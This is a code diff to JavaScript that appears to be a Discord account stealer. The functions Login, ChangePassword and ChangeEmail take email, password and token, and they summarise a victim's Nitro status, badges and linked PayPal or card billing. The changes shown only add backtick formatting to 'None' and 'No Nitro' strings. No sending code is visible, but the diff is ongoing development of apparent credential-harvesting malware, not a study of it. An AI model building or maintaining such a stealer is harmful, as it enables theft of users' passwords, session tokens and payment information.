@@ -468,7 +468,7 @@ function GetA2F(reader) {
 
 function GetNitro(flags) {
     if (flags == 0) {
-        return "No Nitro"
+        return "\`No Nitro\`"
     }
     if (flags == 1) {
         return "<:classic:896119171019067423> \`Nitro Classic\`"
@@ -476,7 +476,7 @@ function GetNitro(flags) {
     if (flags == 2) {
         return "<a:boost:824036778570416129> \`Nitro Boost\`"
     } else {
-        return "No Nitro"
+        return "\`No Nitro\`"
     }
 }
 
@@ -691,7 +691,7 @@ function GetBadges(flags) {
         badges += "<:activedev:1041634224253444146> "
     }
     if (badges == "") {
-        badges = "None"
+        badges = "\`None\`"
     }
     return badges
 }
@@ -747,17 +747,17 @@ async function Login(email, password, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "None"
+                        return "\`None\`"
                     } else if (z.type == 2 && z.invalid != !0) {
                         billing += " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
                         billing += " :credit_card:"
                     } else {
-                        return "None"
+                        return "\`None\`"
                     }
                 })
                 if (billing == "") {
-                    billing = "None"
+                    billing = "\`None\`"
                 }
                 return billing
             }
@@ -879,17 +879,17 @@ async function ChangePassword(oldpassword, newpassword, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "None"
+                        return "\`None\`"
                     } else if (z.type == 2 && z.invalid != !0) {
                         billing += " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
                         billing += " :credit_card:"
                     } else {
-                        return "None"
+                        return "\`None\`"
                     }
                 })
                 if (billing == "") {
-                    billing = "None"
+                    billing = "\`None\`"
                 }
                 return billing
             }
@@ -1004,17 +1004,17 @@ async function ChangeEmail(newemail, password, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "None"
+                        return "\`None\`"
                     } else if (z.type == 2 && z.invalid != !0) {
                         billing += " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
                         billing += " :credit_card:"
                     } else {
-                        return "None"
+                        return "\`None\`"
                     }
                 })
                 if (billing == "") {
-                    billing = "None"
+                    billing = "\`None\`"
                 }
                 return billing
             }
